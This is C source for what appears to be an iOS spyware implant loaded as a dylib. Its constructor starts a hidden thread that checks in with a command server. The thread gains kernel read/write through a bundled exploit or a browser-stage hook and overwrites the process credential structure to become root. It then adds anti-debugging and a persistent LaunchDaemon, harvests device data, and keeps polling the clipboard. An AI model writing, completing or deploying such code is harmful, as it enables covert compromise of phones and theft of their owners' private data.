#include "memory.h"
#include "offsets.h"
#include "kernel_exploit.h"
#include "injection.h"
#include "persistence.h"
#include "c2.h"
#include "stealth.h"
#include "data_harvest.h"
#include <pthread.h>
#include <unistd.h>

/* ── Privilege escalation (requires kernel r/w primitives) ─────────────────── */
static void elevate_to_root(void) {
    const KernelOffsets *off = get_kernel_offsets();
    if (!off) return;

    uint64_t kbase = kernel_base();
    if (!kbase) return;

    /*
     * allproc_offset is a relative offset (static_VA − 0xFFFFFFF007004000).
     * Adding the runtime kernel_base gives the runtime allproc address.
     */
    uint64_t allproc = kbase + off->allproc_offset;

    /* Walk the allproc linked list to find the current process.
     * Cap at 65536 iterations: more than any real iOS device will ever have.
     * Without this guard a wrong allproc_offset loops forever and triggers
     * the WatchDog, killing the WebContent process before any data is sent. */
    uint64_t proc = kread64(allproc);
    int walk_limit = 65536;
    while (proc && walk_limit-- > 0) {
        pid_t pid = (pid_t)kread64(proc + off->proc_p_pid);
        if (pid == getpid()) break;
        proc = kread64(proc + off->proc_p_list_next);
    }
    if (!proc || walk_limit <= 0) return;

    uint64_t ucred = kread64(proc + off->proc_p_ucred);
    if (!ucred) return;

    /*
     * XNU ucred layout (arm64, iOS 15–17, XNU 10002):
     *   +0x00  cr_link     (TAILQ_ENTRY, 16 B)
     *   +0x10  cr_ref      (u_long, 8 B)
     *   +0x18  cr_uid      (uid_t, 4 B)   ← ucred_cr_uid
     *   +0x1C  cr_ruid     (uid_t, 4 B)
     *   +0x20  cr_svuid    (uid_t, 4 B)   ← ucred_cr_svuid
     *   +0x24  cr_ngroups  (short, 2 B)   — must NOT be cleared
     *   +0x26  (padding, 2 B)
     *   +0x28  cr_groups[] (uid_t[])
     *
     * Write strategy:
     *   1. kwrite64(ucred + 0x18, 0) → zeros cr_uid + cr_ruid atomically (8 B).
     *   2. For cr_svuid at +0x20: read the existing 8-byte word (cr_svuid|cr_ngroups),
     *      zero only the low 32 bits (cr_svuid), preserve cr_ngroups.
     *
     * This avoids corrupting cr_ngroups (which would break group membership
     * checks) and cr_groups[] (which would destroy supplementary groups).
     */
    kwrite64(ucred + off->ucred_cr_uid, 0); /* zeros cr_uid AND cr_ruid (8 B) */

    /* Preserve cr_ngroups while zeroing cr_svuid */
    uint64_t svuid_word = kread64(ucred + off->ucred_cr_svuid);
    svuid_word &= 0xFFFFFFFF00000000ULL;    /* clear low 32 b (cr_svuid = 0) */
    kwrite64(ucred + off->ucred_cr_svuid, svuid_word);

    setuid(0);
    setgid(0);
}

/* ── Background implant entry point ────────────────────────────────────────── */
static void *implant_main(void *arg) {
    (void)arg;

    /* Announce ourselves to C2 immediately so the operator knows we loaded. */
    upload_device_info();

    /*
     * Kernel primitive acquisition strategy (by priority):
     *
     *  1. ke_run() — self-contained physical OOB exploit (pe_v1) that builds
     *     kread64/kwrite64/kbase internally, then calls coruna_init_primitives().
     *     Times out after 15 s if the exploit races do not converge.
     *
     *  2. coruna_hook_slot — if ke_run() fails (A18 device, OOB timeout, or
     *     sandbox block), wait up to 5 s for Stage3_VariantB.js to write real
     *     kernel VAs via exploitPrimitive.write64.
     *
     *  If both paths fail we degrade gracefully: skip privilege escalation
     *  and run data collection with whatever sandbox permissions we already have.
     */

    /* Path 1: self-bootstrapping kernel exploit */
    if (!kernel_base())
        ke_run();

    /* Path 2: wait for Stage3 to populate hook_slot (max ~5 s) */
    for (int i = 0; i < 50 && !kernel_base(); i++) {
        volatile uint64_t magic = coruna_hook_slot[3];
        if (magic == (uint64_t)CORUNA_HOOK_MAGIC) {
            coruna_init_primitives_from_addrs(
                (uint64_t)coruna_hook_slot[0],
                (uint64_t)coruna_hook_slot[1],
                (uint64_t)coruna_hook_slot[2]);
            coruna_hook_slot[3] = 0;
            break;
        }
        usleep(100000);
    }

    if (kernel_base()) {
        apply_anti_debug();
        elevate_to_root();
        install_launchdaemon();
    }

    harvest_all();

    /* Heartbeat loop: stay alive and periodically re-scan clipboard. */
    while (1) {
        c2_heartbeat();
        harvest_clipboard(); /* re-check clipboard every 30 s */
        sleep(30);
    }
    return NULL;
}

/* ── dylib constructor ──────────────────────────────────────────────────────── */
__attribute__((constructor))
void coruna_constructor(void) {
    pthread_t tid;
    if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
        pthread_detach(tid);
}
